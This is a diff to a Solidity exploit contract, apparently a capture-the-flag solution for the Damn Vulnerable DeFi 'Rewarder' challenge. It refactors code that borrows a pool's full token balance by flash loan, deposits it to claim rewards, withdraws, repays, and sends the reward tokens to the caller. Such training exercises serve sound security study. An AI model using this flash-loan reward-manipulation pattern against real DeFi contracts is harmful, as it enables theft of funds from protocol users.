@@ -116,12 +116,8 @@ contract AttackRewarderPool {
     DamnValuableToken public immutable liquidityToken;
     TheRewarderPool immutable rewardPool;
     RewardToken public immutable rewardToken;
-    address private lenderPoolAddress;
-    address private rewardPoolAddress;
 
     constructor(address _lenderPool, address _tokenAddress, address _rewardPool, address _rewardTokenAddress) {
-        lenderPoolAddress = _lenderPool;
-        rewardPoolAddress = _rewardPool;
         lenderPool = FlashLoanerPool(_lenderPool);
         liquidityToken = DamnValuableToken(_tokenAddress);
         rewardPool = TheRewarderPool(_rewardPool);
@@ -129,17 +125,17 @@ contract AttackRewarderPool {
     }
 
     function exploit() public {
-        console.log("Flash Loan Pool balance : ", liquidityToken.balanceOf(lenderPoolAddress));
-        lenderPool.flashLoan(liquidityToken.balanceOf(lenderPoolAddress));
+        console.log("Flash Loan Pool balance : ", liquidityToken.balanceOf(address(lenderPool)));
+        lenderPool.flashLoan(liquidityToken.balanceOf(address(lenderPool)));
         rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
     }
 
     function receiveFlashLoan(uint256 amount) public { 
         console.log("Received Loan : ", amount);
-        liquidityToken.approve(rewardPoolAddress, amount);
+        liquidityToken.approve(address(rewardPool), amount);
         rewardPool.deposit(amount);
         rewardPool.withdraw(amount);
-        liquidityToken.transfer(lenderPoolAddress, amount);
+        liquidityToken.transfer(address(lenderPool), amount);
     }
 
 }
